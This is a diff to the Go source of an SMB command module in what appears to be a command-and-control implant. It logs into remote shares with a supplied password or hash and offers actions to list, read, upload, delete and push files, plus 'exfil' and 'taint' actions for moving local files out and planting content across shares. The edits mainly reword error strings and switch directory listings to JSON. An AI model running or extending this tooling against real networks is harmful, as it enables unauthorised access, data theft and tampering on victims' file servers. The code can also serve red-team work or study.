@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -12,6 +13,24 @@ import (
 
 	"github.com/hirochachacha/go-smb2"
 )
+
+type smbDirListing struct {
+	Action     string         `json:"action"`
+	Host       string         `json:"host"`
+	Share      string         `json:"share"`
+	IsFile     bool           `json:"is_file"`
+	Name       string         `json:"name"`
+	ParentPath string         `json:"parent_path"`
+	Success    bool           `json:"success"`
+	Files      []smbFileEntry `json:"files"`
+}
+
+type smbFileEntry struct {
+	Name       string `json:"name"`
+	IsFile     bool   `json:"is_file"`
+	Size       int64  `json:"size"`
+	ModifyTime string `json:"modify_time"`
+}
 
 type SmbCommand struct{}
 
@@ -42,7 +61,7 @@ type smbArgs struct {
 
 func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Use -action <shares|ls|cat|upload|rm|mkdir|mv> -host <target> -username <user> -password <pass>")
+		return errorResult("parameters required. Use -action <shares|ls|cat|upload|rm|mkdir|mv> -host <target> -username <user> -password <pass>")
 	}
 
 	args, parseErr := unmarshalParams[smbArgs](task)
@@ -52,11 +71,11 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 	defer zeroCredentials(&args.Password, &args.Hash)
 
 	if args.Host == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
-		return errorResult("Error: host, username, and password (or hash) are required")
+		return errorResult("host, username, and password (or hash) are required")
 	}
 
 	if args.Action == "" {
-		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint, share-perms, share-spider, share-search")
+		return errorResult("action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint, share-perms, share-spider, share-search")
 	}
 
 	if args.Port <= 0 {
@@ -73,60 +92,60 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 		return smbListShares(args)
 	case "ls":
 		if args.Share == "" {
-			return errorResult("Error: -share required for ls action")
+			return errorResult("-share required for ls action")
 		}
 		return smbListDir(args)
 	case "cat":
 		if args.Share == "" || args.Path == "" {
-			return errorResult("Error: -share and -path required for cat action")
+			return errorResult("-share and -path required for cat action")
 		}
 		return smbReadFile(args)
 	case "upload":
 		if args.Share == "" || args.Path == "" || args.Content == "" {
-			return errorResult("Error: -share, -path, and -content required for upload action")
+			return errorResult("-share, -path, and -content required for upload action")
 		}
 		return smbWriteFile(args)
 	case "rm":
 		if args.Share == "" || args.Path == "" {
-			return errorResult("Error: -share and -path required for rm action")
+			return errorResult("-share and -path required for rm action")
 		}
 		return smbDeleteFile(args)
 	case "mkdir":
 		if args.Share == "" || args.Path == "" {
-			return errorResult("Error: -share and -path required for mkdir action")
+			return errorResult("-share and -path required for mkdir action")
 		}
 		return smbMkdir(args)
 	case "mv":
 		if args.Share == "" || args.Path == "" || args.Destination == "" {
-			return errorResult("Error: -share, -path (source), and -destination (target) required for mv action")
+			return errorResult("-share, -path (source), and -destination (target) required for mv action")
 		}
 		return smbRename(args)
 	case "push":
 		if args.Share == "" || args.Path == "" || args.Source == "" {
-			return errorResult("Error: -share, -path (remote destination), and -source (local file) required for push action")
+			return errorResult("-share, -path (remote destination), and -source (local file) required for push action")
 		}
 		return smbPushFile(args)
 	case "exfil":
 		if args.Share == "" || args.Source == "" {
-			return errorResult("Error: -share and -source (local file) required for exfil action. -path is optional (default: random name)")
+			return errorResult("-share and -source (local file) required for exfil action. -path is optional (default: random name)")
 		}
 		return smbExfilFile(args)
 	case "taint":
 		if args.Source == "" && args.Content == "" {
-			return errorResult("Error: -source (local file to plant) or -content (inline content) required for taint action")
+			return errorResult("-source (local file to plant) or -content (inline content) required for taint action")
 		}
 		return smbTaintShares(args)
 	case "share-perms":
 		return smbSharePerms(args)
 	case "share-spider":
 		if args.Share == "" {
-			return errorResult("Error: -share required for share-spider action")
+			return errorResult("-share required for share-spider action")
 		}
 		return smbShareSpider(args)
 	case "share-search":
 		return smbShareSearch(args)
 	default:
-		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint, share-perms, share-spider, share-search", args.Action)
+		return errorf("unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint, share-perms, share-spider, share-search", args.Action)
 	}
 }
 
@@ -167,7 +186,7 @@ func smbConnect(args smbArgs) (*smbConn, error) {
 func smbListShares(args smbArgs) structs.CommandResult {
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -175,7 +194,7 @@ func smbListShares(args smbArgs) structs.CommandResult {
 	shares, err := sc.session.ListSharenames()
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error listing shares: %v", err)
+		return errorf("listing shares: %v", err)
 	}
 
 	var sb strings.Builder
@@ -191,7 +210,7 @@ func smbListShares(args smbArgs) structs.CommandResult {
 func smbListDir(args smbArgs) structs.CommandResult {
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s for directory listing: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -199,12 +218,11 @@ func smbListDir(args smbArgs) structs.CommandResult {
 	share, err := sc.session.Mount(args.Share)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+		return errorf("mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
 	dirPath := args.Path
-	// Normalize path: strip leading backslashes/slashes (users often try UNC-style \\)
 	dirPath = strings.TrimLeft(dirPath, "\\/")
 	if dirPath == "" {
 		dirPath = "."
@@ -214,31 +232,50 @@ func smbListDir(args smbArgs) structs.CommandResult {
 	entries, err := share.ReadDir(dirPath)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error listing \\\\%s\\%s\\%s: %v", args.Host, args.Share, dirPath, err)
+		return errorf("listing \\\\%s\\%s\\%s: %v", args.Host, args.Share, dirPath, err)
 	}
 
-	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("[*] \\\\%s\\%s\\%s (%d entries)\n", args.Host, args.Share, dirPath, len(entries)))
-	sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", "Size", "Modified", "Name"))
-	sb.WriteString(strings.Repeat("-", 60) + "\n")
+	parentPath := args.Share
+	name := dirPath
+	if dirPath == "." {
+		parentPath = ""
+		name = args.Share
+	} else if idx := strings.LastIndexAny(dirPath, "\\/"); idx >= 0 {
+		name = dirPath[idx+1:]
+		parentPath = args.Share + "\\" + dirPath[:idx]
+	}
+
+	listing := smbDirListing{
+		Action:     "ls",
+		Host:       args.Host,
+		Share:      args.Share,
+		IsFile:     false,
+		Name:       name,
+		ParentPath: parentPath,
+		Success:    true,
+		Files:      make([]smbFileEntry, 0, len(entries)),
+	}
 
 	for _, entry := range entries {
-		name := entry.Name()
-		if entry.IsDir() {
-			name += "/"
-		}
-		size := formatFileSize(entry.Size())
-		modified := entry.ModTime().Format("2006-01-02 15:04:05")
-		sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", size, modified, name))
+		listing.Files = append(listing.Files, smbFileEntry{
+			Name:       entry.Name(),
+			IsFile:     !entry.IsDir(),
+			Size:       entry.Size(),
+			ModifyTime: entry.ModTime().Format(time.RFC3339),
+		})
 	}
 
-	return successResult(sb.String())
+	data, err := json.Marshal(listing)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
+	return successResult(string(data))
 }
 
 func smbReadFile(args smbArgs) structs.CommandResult {
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s for file read: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -246,7 +283,7 @@ func smbReadFile(args smbArgs) structs.CommandResult {
 	share, err := sc.session.Mount(args.Share)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+		return errorf("mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -254,7 +291,7 @@ func smbReadFile(args smbArgs) structs.CommandResult {
 	f, err := share.Open(args.Path)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error opening \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+		return errorf("opening \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
 	}
 	defer func() { _ = f.Close() }()
 
@@ -263,20 +300,20 @@ func smbReadFile(args smbArgs) structs.CommandResult {
 	info, err := f.Stat()
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error getting file info: %v", err)
+		return errorf("getting file info: %v", err)
 	}
 
 	// Limit to 10MB to avoid memory issues
 	const maxSize = 10 * 1024 * 1024
 	if info.Size() > maxSize {
-		return errorf("Error: file too large (%s). Max 10MB for cat. Use download for large files.", formatFileSize(info.Size()))
+		return errorf("file too large (%s). Max 10MB for cat. Use download for large files.", formatFileSize(info.Size()))
 	}
 
 	sc.setDeadline(smbOperationTimeout)
 	data, err := io.ReadAll(f)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error reading file: %v", err)
+		return errorf("reading file: %v", err)
 	}
 
 	var sb strings.Builder
@@ -291,7 +328,7 @@ func smbReadFile(args smbArgs) structs.CommandResult {
 func smbWriteFile(args smbArgs) structs.CommandResult {
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s for file upload: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -299,7 +336,7 @@ func smbWriteFile(args smbArgs) structs.CommandResult {
 	share, err := sc.session.Mount(args.Share)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+		return errorf("mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -307,7 +344,7 @@ func smbWriteFile(args smbArgs) structs.CommandResult {
 	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+		return errorf("creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
 	}
 	defer func() { _ = f.Close() }()
 
@@ -315,7 +352,7 @@ func smbWriteFile(args smbArgs) structs.CommandResult {
 	n, err := f.Write([]byte(args.Content))
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error writing file: %v", err)
+		return errorf("writing file: %v", err)
 	}
 
 	return successf("[+] Written %d bytes to \\\\%s\\%s\\%s", n, args.Host, args.Share, args.Path)
@@ -324,7 +361,7 @@ func smbWriteFile(args smbArgs) structs.CommandResult {
 func smbDeleteFile(args smbArgs) structs.CommandResult {
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s for file deletion: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -332,7 +369,7 @@ func smbDeleteFile(args smbArgs) structs.CommandResult {
 	share, err := sc.session.Mount(args.Share)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+		return errorf("mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -340,7 +377,7 @@ func smbDeleteFile(args smbArgs) structs.CommandResult {
 	err = share.Remove(args.Path)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error deleting \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+		return errorf("deleting \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
 	}
 
 	return successf("[+] Deleted \\\\%s\\%s\\%s", args.Host, args.Share, args.Path)
@@ -349,7 +386,7 @@ func smbDeleteFile(args smbArgs) structs.CommandResult {
 func smbMkdir(args smbArgs) structs.CommandResult {
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s for mkdir: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -357,7 +394,7 @@ func smbMkdir(args smbArgs) structs.CommandResult {
 	share, err := sc.session.Mount(args.Share)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+		return errorf("mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -365,7 +402,7 @@ func smbMkdir(args smbArgs) structs.CommandResult {
 	err = share.MkdirAll(args.Path, 0755)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+		return errorf("creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
 	}
 
 	return successf("[+] Created directory \\\\%s\\%s\\%s", args.Host, args.Share, args.Path)
@@ -374,7 +411,7 @@ func smbMkdir(args smbArgs) structs.CommandResult {
 func smbRename(args smbArgs) structs.CommandResult {
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s for rename: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -382,7 +419,7 @@ func smbRename(args smbArgs) structs.CommandResult {
 	share, err := sc.session.Mount(args.Share)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+		return errorf("mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -390,7 +427,7 @@ func smbRename(args smbArgs) structs.CommandResult {
 	err = share.Rename(args.Path, args.Destination)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error renaming \\\\%s\\%s\\%s → %s: %v", args.Host, args.Share, args.Path, args.Destination, err)
+		return errorf("renaming \\\\%s\\%s\\%s → %s: %v", args.Host, args.Share, args.Path, args.Destination, err)
 	}
 
 	return successf("[+] Renamed \\\\%s\\%s\\%s → %s", args.Host, args.Share, args.Path, args.Destination)
@@ -403,13 +440,13 @@ func smbPushFile(args smbArgs) structs.CommandResult {
 	// Read local file
 	data, err := os.ReadFile(args.Source)
 	if err != nil {
-		return errorf("Error reading local file %s: %v", args.Source, err)
+		return errorf("reading local file %s: %v", args.Source, err)
 	}
 	defer structs.ZeroBytes(data) // clear file content from memory
 
 	sc, err := smbConnect(args)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to open SMB session to %s for file push: %v", args.Host, err)
 	}
 	defer sc.close()
 
@@ -423,7 +460,7 @@ func smbPushFile(args smbArgs) structs.CommandResult {
 	share, err := sc.session.Mount(args.Share)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+		return errorf("mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -431,7 +468,7 @@ func smbPushFile(args smbArgs) structs.CommandResult {
 	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+		return errorf("creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
 	}
 	defer func() { _ = f.Close() }()
 
@@ -439,7 +476,7 @@ func smbPushFile(args smbArgs) structs.CommandResult {
 	n, err := f.Write(data)
 	sc.clearDeadline()
 	if err != nil {
-		return errorf("Error writing to \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+		return errorf("writing to \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
 	}
 
 	return successf("[+] Pushed %s (%s) → \\\\%s\\%s\\%s",
